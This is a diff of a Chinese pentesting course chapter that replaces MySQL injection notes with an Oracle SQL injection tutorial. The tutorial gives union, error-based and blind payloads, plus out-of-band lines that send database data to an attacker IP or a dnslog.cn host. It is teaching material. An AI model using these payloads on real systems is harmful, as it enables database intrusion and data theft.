@@ -1,16 +1,6 @@
-# 第8讲附章 SQL注入测试细节
+# 第8讲附章 Oracle SQL 注入
 
-- Testing_for_Oracle
-- Testing_for_MySQL
-- Testing_for_SQL_Server
-- Testing_PostgreSQL
-- Testing_for_MS_Access
-- Testing_for_NoSQL_Injection
-- Testing_for_ORM_Injection
-- Testing_for_Client_Side
-
-## Oracle 测试
-
+## OWASP WEB TEST GUIDE 
 ### 概述
 
 基于Web的PL/SQL应用通过PL/SQL网关运行，这一网关可以讲web请求转换为数据库查询。Oracle已经开发了很多软件，从早期web监听产品到Apache ```mod_plsql```模块，再到XML Database（XDB）web服务器。所有的产品有其自身的特点和问题，本节将尽可能的分析这些问题。使用PL/SQL网关的产品包括但不限于：
@@ -294,263 +284,389 @@ END;--','SYS',1,'VER',0);END;
 - SQLInjector
 - Orascan (Oracle Web Application VA scanner), NGS SQuirreL (Oracle RDBMS VA Scanner)
 
-## Mysql sql注入测试
 
-### 摘要
+## 一篇文章入门Oracle注入 建议收藏
 
-凡是没有充分约束或清理用户输入，而且使用这些输入构造SQL查询，就会发生SQL注入漏洞。使用动态SQL（通过字符串连接构造SQL查询）为这些漏洞打开了大门。SQL注入使攻击者可以访问SQL服务器。它允许在用于连接数据库的用户权限下执行SQL代码。
+https://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&mid=2247487986&idx=1&sn=2028a269ff5dad1b31708847db34c8da&chksm=9acec16dadb9487bf16a5478907bdf176db102c832650f69bb77ba35c7e312fbb51023f20dec&mpshare=1&scene=24&srcid=08192W9s4uIcvTfwjdNEfZSi&sharer_sharetime=1597832503200&sharer_shareid=9530e1864f9ccae4832cd88b98041964&exportkey=AYbkIpx7Lc%2B3DdCWUS8fTys%3D&pass_ticket=nQcihpZIrgq%2F0dgwRHBaNkcP2TMN7UhBJZ%2BftGUPWoYWtdYy24W%2FTS9YUwwG9Jh%2B&wx_header=0#rd
 
-MySQL服务器具有一些特殊性，因此某些漏洞需要为此专门定制。这是本节的主题。
+### Oracle 测试环境安装
 
-### 测试方法
-当在由MySQL数据库支持的应用程序中发现SQL注入漏洞时，根据MySQL版本和DBMS上的用户权限，可能会执行多种攻击。
+目前使用docker比较方便：
 
-MySQL至少有4个版本较为常见：3.23.x，4.0.x，4.1.x和5.0.x。每个版本都有一组能揭示当前版本的特性指纹。
-- 4.0之后：增加了 UNION
-- 4.1之后：增加了 Subqueries
-- 5.0之后，增加了： 存储过程、存储函数、命名为 INFORMATION_SCHEMA 的视图
-- 5.0.2之后，增加了：Triggers
+```
+# 拉取镜像
+$ docker pull deepdiver/docker-oracle-xe-11g
 
-注意，对于MSSQL 4.0.x之前的版本，仅Boolean或基于时间的盲注攻击可以使用，因为子查询功能或UNION语句还没有实现。
+# 启动容器
+$ docker run --rm -d --name oracledb -p 1002:22 -p 1521:1521 deepdiver/docker-oracle-xe-11g
 
-现在，我们假设有一个典型的SQL注入漏洞，其请求链接为：```http://www.example.com/page.php?id=2```.
+# 可以选择进入docker操作，不需要将docker 22端口映射出来。
+$ docker exec -it oracledb bash
+```
 
-#### 单引号问题
+### Oracle 基础概念
 
-在利用MySQL特性之前，必须考虑如何在语句中表示字符串，因为Web应用程序通常会用单引号引起来。Mysql引号转义如下：
-```'A string with \'quotes\''```
+- dual是Oracle中的虚表，任何用户可以读取，常用在没有目标表的select语句中。
+- Oracle数据库使用3种语言：SQL、PL/SQL、Java。
 
-这里，Mysql解释```\'```为字符，而不是元字符。所以假如应用正常工作，下面两个使用静态字符串的例子是有区别的：
-- Web应用转义单引号```'```为```\'```
-- Web应用不转义单引号```'```为```'```
+#### 实例
 
-在Mysql中，有一种标准做法可以绕过单引号，即不使用单引号来声明静态字符串。假设我们想知道某个名为 password 字段的值，那么查询条件可以如下组织：
-- ```password like 'A%'```
-- ASCII值以十六进制形式拼接：```password like 0x4125```
-- 使用函数```char()```: ```password LIKE CHAR(65,37)```
+一个Oracle实例（Oracle Instance）有一系列的后台进程和内存结构组成。一个数据库可以有n个实例。
 
-#### 多种混合查询
+#### 用户  
+Oracle数据库的基本单位，等同于Mysql中的库。
+- Mysql：当前数据库下有N张表  <=> Oracle：当前用户下有N张表。
 
-Mysql库连接器不支持使用```;```区分的多查询，因此无法像Microsoft SQL Server一样在单个SQL注入漏洞中注入多个非同类SQL命令。例如，下列语句会错误：```1 ; update tablename set code='javascript code' where 1 --```
+#### 表空间  
 
-#### 信息收集
+- 表空间是Oracle对物理数据库上相关数据文件（ORA或者DBF文件）的逻辑映射。
 
-##### 指纹发现
+- 一个数据库在逻辑上被划分成一到若干个表空间，每个表空间包含了在逻辑上相关的一组结构。
 
-首先要知道的是是否有MySQL DBMS作为后端数据库。MySQL服务器具有一项功能，该功能用于让其他DBMS忽略MySQL方言中的子句。当注释块```'/**/'```包含感叹号时，```'/*! sql here*/'```它将由MySQL解释，并由其他DBMS视为普通注释块，正如MySQL手册中所述。
+- 每个数据库至少有一个表空间（称之为system表空间）。
+- 每个表空间由同一磁盘上的一个或多个文件组成，这些文件叫数据文件（datafile）。
+- 一个数据文件只能属于一个表空间。
+
+#### 数据文件（dbf,ora）  
+- 数据文件是数据库的物理存储单位。
+- 表空间与数据文件是一对多的关系（用户与表空间也是一对多的关系），而数据文件只能属于一个表空间，删除数据文件需先删除该文件所属的表空间。
+- 表的数据，是由用户放入某一个表空间的，而这个表空间会随机把这些表数据放到一个或多个数据文件中。
+
+
+#### Oracle数据库中常用角色
+- connect --连接角色，基本角色
+- resource --开发者角色
+- dba --超级管理员角色
+
+- Oracle数据库存在默认用户：scott，密码：tiger。需要超级管理员权限用户解锁。
+
+
+#### 数据类型
+- varchar, varchar2  表示一个字符串。
+- NUMBER    NUMBER(n)表示一个整数，长度是n；
+- NUMBER(m,n)表示一个小数，总长度m，小数：n，整数是m-n。eg: NUMBER(4,2) 表示最大可以存储数字为99.993. 
+- DATA      表示日期类型
+- CLOB      大对象，表示大文本数据类型，可存4G
+- BLOB      大对象，表示二进制数据，可存4G
+
+#### 其他知识点
+表。
+- ALL_TABLES描述当前用户可访问的关系表。（类似Mysql中的information_schema.tables）
+- DBA_ALL_TABLES描述数据库中的所有对象表和关系表。其列与中的列相同ALL_ALL_TABLES。
+- ALL_ALL_TABLES 描述当前用户可访问的对象表和关系表。
+- USER_ALL_TABLES描述当前用户拥有的对象表和关系表。
+- DBA_TABLES描述数据库中的所有关系表，其列与ALL_TABLES中的列相同，查询条件：DBA权限用户。
+
+#### Oracle SQL语法
+
+查看当前连接用户:
+```SQL> select user from dual;```
+
+创建用户名为sqli密码为pentest的用户:
+```SQL> create user sqli identified by pentest;```
+
+给新创建的用户授权:
+- connect角色,保证该用户可以连接数据库;
+- resource角色：该用户可以使用数据库资源.
+  
+```SQL> grant connect,resource to sqli;```
+
+删除用户：当前连接数据库的用户必须具有删除用户权限（如sys）
+
+创建表空间（需要超级管理员权限）
+```sql
+SQL> create tablespace pentest
+  2  datafile '/tmp/pentest.dbf'
+  3  size 100m
+  4  autoextend on
+  5  next 10m;
+```
+
+删除表空间
+```SQL> drop tablespace pentest;```
+
+注意：删除表空间后，数据文件依旧存在。
+
+创建users表：
+```sql
+SQL> create table users(
+  2  id number(10),
+  3  uname varchar2(16),
+  4  pwd varchar2(32)
+  5  )
+  6  ;
+```
+添加列:
+```sql
+SQL> alter table users add email varchar2(40);
+```
+
+修改列数据类型:
+```SQL> alter table users modify email char(40);```
+
+修改列的名称:
+```SQL> alter table users rename column email to sex;```
+
+删除列:
+```SQL> alter table users drop column sex;```
+
+插入数据（values字符串不能使用双引号）:
+```SQL> insert into users (id,uname,pwd) values(1,'admin','ab71giedas98g1o2dasgd12e98g');```
+
+修改数据:
+```update users set uname='administrator';```
+
+删除数据:
+```delete from users where uname='administrator';```
+
+生成序列：
+```SQL> create sequence s_users;```
+注意：默认从1开始：依次递增，主要用来给主键赋值使用。序列不真的属于任何表，但是可以逻辑和表做绑定。
+
+
+插入数据：
+```SQL> insert into users (id,uname,pwd) values(s_users.nextval,'ceshi','d81bojd09sha1onpmd09a');```
+
+
+查询数据：
+```SQL> select * from users;```
+
+联合查询：
+**注：Oracle中表达式必须具有与对应表达式相同的数据类型，且在Oralce数据库中要求select语句后必须指定要查询的表名（使用虚表dual即可)
+
+```SQL> select * from users where id=2 union select null,null,null from dual;```
+
+
+
+### Orcale数据库注入
+
+#### 特殊字符、操作函数
+
+- ```||```, 双直线是Oracle中的字符串拼接运算符。 ```select 'pen'||'test' from dual;```
+- ```rownum```分页操作（mysql中的limit）```SQL> select * from users where rownum<2; ```
+  - rownum后面可跟```<,<=,!=```
+- ```--```,```-- -```,```--空格```,```/*  */``` 均是Oracle支撑的注释符
+- oracle数据库是大小写敏感的。
+
+#### 信息查询
+
+获取版本信息：
+- ```select banner from v$version;``` 
+
+使用正则匹配，精确获取信息：
+- ```select banner from v$version where banner like 'Oracle%';``` 
+
+获取当前用户：
+- ```select user from dual;```
+
+获取数据库所有用户：
+```select username from all_users;```
+
+```SELECT name FROM sys.user$; ```-- 需要高权限
+
+获取当前用户权限
+```SQL> select * from session_privs;```
+
+获取当前用户所拥有权限下的所有数据库
+```SQL> select distinct owner,table_name from all_tables;```
+
+获取指定表的字段（注意这里的table_name全部大写）
+```SQL> select column_name from all_tab_columns where table_name='USERS';```
+
+
+Oracle提供了一个名为的内置命名空间USERENV，用于描述当前会话。
+
+以下语句返回登录到数据库的用户的名称：
+
+```sql
+SQL> select SYS_CONTEXT('USERENV','SESSION_USER') from dual;SYS_CONTEXT('USERENV','SESSION_USER')
+
+
+SQLISQL> select SYS_CONTEXT('USERENV','AUTHENTICATED_IDENTITY') from dual;SYS_CONTEXT('USERENV','AUTHENTICATED_IDENTITY')
+
+```
+
+获取当前数据库名
+```SQL> select * from global_name;```
+
+说明：GLOBAL_NAME 包含一行，显示当前数据库的全局名称。
+
+实现mysql的group_concat:
+```SQL> select listagg(column_name,'~') within group (order by column_name) from user_tab_columns;```
+
+```LISTAGG(COLUMN_NAME,'~')WITHIN GROUP(ORDERBY COLUMN_NAME)```
+
+说明：LISTAGG 对 ORDER BY 子句中指定的每个组内的数据进行排序，然后合并度量列的值。measure_expr可以是任何表达。度量列中的空值将被忽略。
+
+
+USER_TABLES描述当前用户拥有的关系。
+
+
+获取表名：
+```sql
+SQL> select * from users where id=2 union select null,null,(select listagg(table_name,'~') within group(order by 1) from all_tables where owner='SQLI') from dual;
+```
+
+获取指定表的字段名：
+```sql
+SQL> select * from users where id=2 union select null,null,(select listagg(column_name,':') within group(order by 1) from all_tab_columns where table_name='USERS') from dual;
+```
+
+获取指定字段内容:
+```sql
+SQL> select * from users where id=2 union select null,null,(select listagg(uname||'&'||pwd,':') within group(order by 1) from users where rownum=1) from dual;
+```
+
+#### 报错注入
+
+##### 利用 UTL_INADDR 程序包功能实现报错注入
+
+报错注入的本质就是使数据库返回一个语法等错误，并且返回错误中的某些内容我们可控，借此来获取我们需要的信息。
+
+UTL_INADDR 程序包提供了一个PL/SQL过程来支持Internet寻址。它提供了一个API，用于检索本地和远程主机的主机名和IP地址。
+
+UTL_INADDR 程序包是调用者的权限程序包，这意味着必须connect在分配给他或她希望连接到的远程网络主机的访问控制列表中向调用用户授予特权。
+
+可以使用该包中的GET_HOST_ADDRESS ，GET_HOST_NAME函数来进行报错注入。
+
+调用语法：
+```UTL_INADDR.GET_HOST_NAME (ip  IN VARCHAR2 DEFAULT NULL)```
+
+返回：host_name VARCHAR2;
+
+由于GET_HOST_ADDRESS函数所需参数类型是varchar2，且报错时会将参数表达式结果返回，因此可以借此实现报错注入。
+
+还可以使用GET_HOST_NAME函数进行报错攻击。
+
+需要注意的是，执行UTL_INADDR软件包需要拥有connect权限的用户。
+
+##### 利用 ctxsys.drithsx.sn 实现报错注入
+
+```SQL> select * from users where id=1 and 1=(select ctxsys.drithsx.sn(1,(select user from dual))from dual);```
+
+##### 利用 ctxsys.ctx_report.token_type 
+
+这是一个辅助功能，可将英语名称转换为数字标记类型。
+
+使用方法：
+```sql
+function token_type(
+  index_name in varchar2,
+  type_name  in varchar2
+) return number;
+
+SQL> select ctxsys.ctx_report.token_type((select user from dual),1) from dual;
+
+```
+
+结果如下：
+```sql
+select ctxsys.ctx_report.token_type((select user from dual),1) from dual
+       *
+ERROR at line 1:
+ORA-20000: Oracle Text error:
+DRG-10502: index SQLI does not exist
+ORA-06512: at "CTXSYS.DRUE", line 160
+ORA-06512: at "CTXSYS.CTX_REPORT", line 711
+这种类似的可以用来报错注入的函数很多，举个例子：
+SQL> select ctxsys.ctx_report.token_info('aa','xx',1)from dual;
+ERROR:
+ORA-20000: Oracle Text error:
+DRG-10502: index AA does not exist
+ORA-06512: at "CTXSYS.DRUE", line 160
+ORA-06512: at "CTXSYS.CTX_REPORT", line 615
+ORA-06512: at line 1
+
+no rows selected
+```
+
+##### 利用 dbms_xdb_version.checkin
+
+此函数检入已签出的VCR，并返回新创建版本的资源ID。
+
+CHECKIN函数用法：DBMS_XDB_VERSION.CHECKIN(   pathname VARCHAR2) 
+- 返回：DBMS_XDB.resid_type;  
+- 如果路径名不存在，则会引发异常。
 
 例如：
-```1 /*! and 1=0 */```
-如果后台运行mysql，那么注释块中的内容会被解释执行。
+```SQL> select * from users where id=1 and '0x2e'=(select dbms_xdb_version.checkin((select user from dual))from dual);select * from users where id=1 and '0x2e'=(select dbms_xdb_version.checkin((select user from dual))from dual)```
 
-##### 版本号
-有3种方法收集版本信息
-- 使用 global variable ```@@version```
-- 使用函数 ```VERSION()```
-- 使用含有版本号的注释指纹 ```/*!40110 and 1=0*/``` ，这意味着下列语句
-
-```/*!40110 and 1=0*/``` ，这意味着下列语句:
-```
-if(version >= 4.1.10)
-    add 'and 1=0' to the query
-```
-与之有相同结果的还有：
-- 盲注：```1 AND 1=0 UNION SELECT @@version /*```
-- 推断注入：```1 AND @@version like '4.0%'```。响应将包含类似```5.0.22-log```的行。
-
-例如DVWA靶机可执行下列语句：
-```adf' or 1=1 union select version(),'1 ``` 或 ```adf' or 1=1 union select @@version,'1 ```
-结果如下图：
-<img src="images/07/mysqli01.png" width="480" >
-
-
-#####  登录用户
-
-MySQL Server依赖两种用户。
-1.USER()：连接到MySQL服务器的用户。
-2.CURRENT_USER()：正在执行查询的内部用户。
-
-1和2之间有一些区别。主要的区别在于，匿名用户可以连接（如果允许）任何名称，但MySQL内部用户是一个空名称（''）。另一个区别是，如果未在其他地方声明，则存储过程或存储函数将作为创建者用户执行。可以使用来知道CURRENT_USER。
-
-- In band injection: ```1 AND 1=0 UNION SELECT USER()```
-
-- Inferential injection: ```1 AND USER() like 'root%'```
-
-结果可能包含：```user@hostname```
-
-##### 获取数据库名
-
-mysql有一个内置的函数：```database()```
-
-- In band injection:```1 AND 1=0 UNION SELECT DATABASE()```
-- Inferential injection:```1 AND DATABASE() like 'db%'```
-
-结果为数据库名。
-
-##### INFOMATION_SCHEMA
-mysql 5.0之后，有了 INFOMATION_SCHEMA ，它可以获取数据中所有的数据库、表、列、存储过程、函数。
-
-|INFOMATION_SCHEMA中的表|描述|
-|-|-|
-|SCHEMATA	|有 SELECT_priv 权的用户所有的数据库|
-|SCHEMA_PRIVILEGES	|The privileges the user has for each DB|
-|TABLES	|All tables the user has (at least) SELECT_priv|
-|TABLE_PRIVILEGES	|The privileges the user has for each table|
-|COLUMNS	|All columns the user has (at least) SELECT_priv|
-|COLUMN_PRIVILEGES	|The privileges the user has for each column|
-|VIEWS	|All columns the user has (at least) SELECT_priv|
-|ROUTINES	|Procedures and functions (needs EXECUTE_priv)|
-|TRIGGERS	|Triggers (needs INSERT_priv)|
-|USER_PRIVILEGES	|Privileges connected User has|
-
-上述信息可以通过SQL注入来实现。
-
-例如dvwa中盲注sql页例子：```1' union select table_name ,1 from information_schema.tables where '1'='1```
 结果如下：
-```
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: admin
-Surname: admin
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: CHARACTER_SETS
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: COLLATIONS
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: COLLATION_CHARACTER_SET_APPLICABILITY
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: COLUMNS
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: COLUMN_PRIVILEGES
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: ENGINES
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: EVENTS
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: FILES
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: GLOBAL_STATUS
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: GLOBAL_VARIABLES
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: KEY_COLUMN_USAGE
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: PARTITIONS
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: PLUGINS
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: PROCESSLIST
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: PROFILING
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: REFERENTIAL_CONSTRAINTS
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: ROUTINES
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: SCHEMATA
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: SCHEMA_PRIVILEGES
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: SESSION_STATUS
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: SESSION_VARIABLES
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: STATISTICS
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: TABLES
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: TABLE_CONSTRAINTS
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: TABLE_PRIVILEGES
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: TRIGGERS
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: USER_PRIVILEGES
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: VIEWS
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: guestbook
-Surname: 1
-ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
-First name: users
-Surname: 1
-```
+```*ERROR at line 1:ORA-31001: Invalid resource handle or path name "SQLI"```
 
-#### 攻击向量
-##### 写在一个文件中
-如果连接数据库使用的用户有```FILE```权限，且单引号不会被过滤，那么```inot outfile```这种字句就可能被用于导出查询结果到一个文件。SQL语句例如：```Select * from table into outfile '/tmp/file'```
+需要注意使用二进制数据类型:
+- dbms_xdb_version.makeversioned
 
-注意：无法绕过文件名周围的单引号。因此，如果对单引号（例如转义）进行了一些清理，```\'```将无法使用“ into outfile”子句。
-
-这种攻击可用作带外技术，以获取有关查询结果的信息或编写可在Web服务器目录中执行的文件。
-
-Example:
-
-```1 limit 1 into outfile '/var/www/root/test.jsp' FIELDS ENCLOSED BY '//'  LINES TERMINATED BY '\n<%jsp code here%>';```
-
-Results are stored in a file with rw-rw-rw privileges owned by MySQL user and group.
-
-Where /var/www/root/test.jsp will contain:
-
-```//field values// <%jsp code here%>```
-
-##### 从文件中读
-
-```Load_file```是一个能读文件的mysql内置文件，在有文件系统权限时可以使用。如果连接用户有文件权限，他可能使用某个文件的内容，如果单引号被限制，那么可以使用之前讨论的方法进行绕过。
-```load_file('filename')```
-
-#### 标准SQL注入攻击
-
-在标准SQL注入中，您可以将结果直接显示为正常输出或MySQL错误的页面。通过使用已经提到的SQL Injection攻击和已经描述的MySQL功能，直接SQL注入可以很容易地在一个层次上完成，这主要取决于pentester所面对的MySQL版本。
-
-一个好的攻击方法是通过强制函数/过程或服务器本身抛出错误来了解结果。在MySQL手册上可以找到由MySQL引发的错误列表，特别是本机函数。
-
-#### 带外SQL注入
-带外注入可以通过使用“ into outfile”子句来完成。
+MAKEVERSIONED函数用法：DBMS_XDB_VERSION.MAKEVERSIONED(   pathname   VARCHAR2) 
+- 返回 DBMS_XDB.resid_type;
+- 如果资源不存在，则会引发异常。
+- 需要注意使用二进制数据类型
 
 #### 盲注
-对于盲目SQL注入，MySQL服务器本身提供了一组有用的功能。
 
-- 字串长度：```LENGTH(str)```
-- 从给定的字符串中提取一个子字符串：```SUBSTRING(string, offset, #chars_returned)```
-- 基于时间的盲注：```BENCHMARK(#ofcycles,action_to_be_performed)``` 。 当Boolean攻击无任何结果时，可尝试benchmark函数执行计时攻击。也可以使用```SLEEP()```函数作为替代方法（MySQL> 5.0.x）。
+decode函数用来比较:
+```sql
+SQL> select * from users where id=1 and 1=(select decode(user,'SQLI',1) from dual);
+SQL> select * from users where id=1 and 'S'=(select substr(user,1,1)from dual);
+```
+注意：需要注意大小写的问题
 
-例如dvwa盲注处可键入```1' and sleep(5) and '1'='1```,会发现过了5秒后才响应。
+延时注入（用来判断注入点）：
+```SQL> select count(*) from all_objects;```
 
-```1' and benchmark(500000,md5(1)) and '1'='1```,执行500000次的md5(1).
-这些都说明注入有效。
+利用了oracle管道功能接收消息的函数RECEIVE_MESSAGE，实现延时注入:
+```sql
+DBMS_PIPE.RECEIVE_MESSAGE (
+   pipename     IN VARCHAR2,
+   timeout      IN INTEGER      DEFAULT maxwait)
+RETURN INTEGER;
+```
 
-### 工具
+简单的使用
+```SQL> select dbms_pipe.receive_message('aaa',3) from dual;```
 
-Francois Larouche：多个DBMS SQL注入工具
-Reversing.org-sqlbftools
-Bernardo Damele AG：sqlmap，自动SQL注入工具
-Muhaimin Dzulfakar：MySqloit，MySql注入接管工具
+结果：
+```DBMS_PIPE.RECEIVE_MESSAGE('AAA',3)```
 
+```SQL> select dbms_pipe.receive_message('aaa',(decode((select user from dual),'SQLI',3))) from dual;```
+
+
+带外攻击OOB（Out Of Band）:
+- 既然是带外攻击，自然需要connect
+```sql
+utl_http.request
+UTL_HTTP.REQUEST (
+   url              IN VARCHAR2,
+   proxy            IN VARCHAR2 DEFAULT NULL,
+   wallet_path      IN VARCHAR2 DEFAULT NULL,
+   wallet_password  IN VARCHAR2 DEFAULT NULL)
+RETURN VARCHAR2;
+
+SQL> select utl_http.request('http://ip/?result='||(select user from dual))from dual;
+```
+
+我这里测试没有成功，报错ORA-00904: : invalid identifier，可能是版本问题。
+
+utl_inaddr.get_host_address
+报错注入那个函数，不过多介绍了
+```SQL> select utl_inaddr.get_host_address((select user from dual)||'.o6xgjz.dnslog.cn')from dual;```
+
+
+#### DBMS_LDAP软件包使您可以从LDAP服务器访问数据。
+
+FUNCTIONN INIT():	
+- init()用LDAP服务器初始化会话。这实际上建立了与LDAP服务器的连接。
+- 语法: FUNCTION init      (hostname IN VARCHAR2,portnum  IN PLS_INTEGER)RETURN SESSION;
+
+- HTTPURITYPE
+可以创建UriType列，并在其中存储DBURITYPE，XDBURITYPE或HTTPURITYPE的实例。还可以定义自己的UriType子类型来处理不同的URL协议。
+
+
+
+会请求httpuritype所指定的uri的函数(带外的函数)有:
+- GETCONTENTTYPE() 作用：返回URI指向的文档的内容类型。
+- GETCLOB() 作用：返回位于HTTP URL地址的CLOB。
+- GETBLOB() 作用：返回位于URL指定的地址的BLOB。
+  - ```select httpuritype.createuri('http://xxx.o6xgjz.dnslog.cn').getblob() from dual;```
+- GETXML() 作用：返回位于URL指定的地址的。
+  - ```select httpuritype.createuri('http://xxx.o6xgjz.dnslog.cn').getxml() from dual;```
